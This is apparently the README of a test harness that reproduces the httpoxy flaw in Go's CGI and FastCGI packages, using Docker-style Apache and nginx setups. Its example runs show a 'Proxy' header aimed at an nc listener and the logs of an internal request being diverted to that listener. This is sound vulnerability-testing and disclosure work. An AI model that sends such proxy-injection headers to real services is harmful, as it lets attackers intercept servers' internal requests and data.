# Go HTTPoxy Vulnerability under CGI

Go is not usually deployed under CGI.

But there is: https://golang.org/pkg/net/http/cgi/
and: https://golang.org/pkg/net/http/fcgi/

Run `./build` to get started

There are two test cases:

* net/http/cgi with an apache server, and
* net/http/fcgi with an nginx server

## Versions of go tested

* 1.2.1
* 1.6
* Latest snapshot @ 20160630

## Example run

### cgi

```
Testing: cgi/apache...
Testing done.


Here's the curl output from the client
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   532  100   532    0     0  64383      0 --:--:-- --:--:-- --:--:-- 66500
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
</head><body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator at
 webmaster@localhost to inform them of the time this error occurred,
 and the actions you performed just before this error.</p>
<p>More information about this error may be available
in the server error log.</p>
</body></html>


Tests finished. Result time...
Here is the output from the cgi program and apache logs:
==> /var/log/apache2/access.log <==
172.17.0.1 - - [01/Jul/2016:15:34:06 +0000] "GET /httpoxy HTTP/1.1" 500 739 "-" "curl/7.35.0"

==> /var/log/apache2/error.log <==
[Fri Jul 01 15:34:02.516877 2016] [mpm_event:notice] [pid 14:tid 139625779124096] AH00489: Apache/2.4.10 (Debian) OpenSSL/1.0.1t configured -- resuming normal operations
[Fri Jul 01 15:34:02.517157 2016] [core:notice] [pid 14:tid 139625779124096] AH00094: Command line: '/usr/sbin/apache2 -D FOREGROUND'
2016/07/01 15:34:06 Get http://example.com/: EOF
[Fri Jul 01 15:34:06.826194 2016] [cgid:error] [pid 17:tid 139625679427328] [client 172.17.0.1:37733] End of script output before headers: httpoxy

==> /var/log/apache2/other_vhosts_access.log <==


And here is what the attacker got (any output other than a listening line here means trouble)
Listening on [0.0.0.0] (family 0, port 12345)
Connection from [172.17.0.2] port 12345 [tcp/*] accepted (family 2, sport 55574)
GET http://example.com/ HTTP/1.1
Host: example.com
User-Agent: Go 1.1 package http
Accept-Encoding: gzip

end of trouble
```

### fcgi

```
Testing: fcgi/nginx
Testing done.


Here's the curl output from the client
./build: line 111:  6547 Terminated              nc -v -l 12345 > ./fcgi-mallory.log 2>&1
* Hostname was NOT found in DNS cache
*   Trying 127.0.0.1...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 127.0.0.1 (127.0.0.1) port 2082 (#0)
> GET / HTTP/1.1
> User-Agent: curl/7.35.0
> Host: 127.0.0.1:2082
> Accept: */*
> Proxy: 172.17.0.1:12345
>
< HTTP/1.1 200 OK
* Server nginx/1.10.1 is not blacklisted
< Server: nginx/1.10.1
< Content-Type: text/plain; charset=utf-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Date: Fri, 01 Jul 2016 15:34:07 GMT
<
{ [data not shown]
100  1398    0  1398    0     0   2640      0 --:--:-- --:--:-- --:--:--  2637
* Connection #0 to host 127.0.0.1 left intact
Response body from internal subrequest:<!doctype html>
<html>
<head>
    <title>Example Domain</title>

    <meta charset="utf-8" />
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style type="text/css">
    body {
        background-color: #f0f0f2;
        margin: 0;
        padding: 0;
        font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;

    }
    div {
        width: 600px;
        margin: 5em auto;
        padding: 50px;
        background-color: #fff;
        border-radius: 1em;
    }
    a:link, a:visited {
        color: #38488f;
        text-decoration: none;
    }
    @media (max-width: 700px) {
        body {
            background-color: #fff;
        }
        div {
            width: auto;
            margin: 0 auto;
            border-radius: 0;
            padding: 1em;
        }
    }
    </style>
</head>

<body>
<div>
    <h1>Example Domain</h1>
    <p>This domain is established to be used for illustrative examples in documents. You may use this
    domain in examples without prior coordination or asking for permission.</p>
    <p><a href="http://www.iana.org/domains/example">More information...</a></p>
</div>
</body>
</html>

Method: GET
URL: http://127.0.0.1:2082/
RemoteAddr: 172.17.0.1:0
UserAgent: curl/7.35.0


Tests finished. Result time...
Here is the nginx logs (containing output from the fcgi program)
172.17.0.1 - - [01/Jul/2016:15:34:07 +0000] "GET / HTTP/1.1" 200 1410 "-" "curl/7.35.0" "-"


And here is what the attacker got (any output other than a listening line here means trouble)
Listening on [0.0.0.0] (family 0, port 12345)
end of trouble
```

## Results

### net/http/cgi + net/http vulnerable

The results indicate that using net/http while processing a net/http/cgi request is vulnerable to injection of a proxy
via the user-controlled `Proxy` header (because it reads and trusts the environment variable `HTTP_PROXY`). The important
bit is the lines starting at `Connection from [172.17.0.2] port 12345 [tcp/*] accepted (family 2, sport 55574)` that
indicate a remote attacker has received the proxied internal request.

### net/http/fcgi + net/http not vulnerable

The results also indicate that using net/http/fcgi is not vulnerable in the same way (because environment variables are
not actually set.)
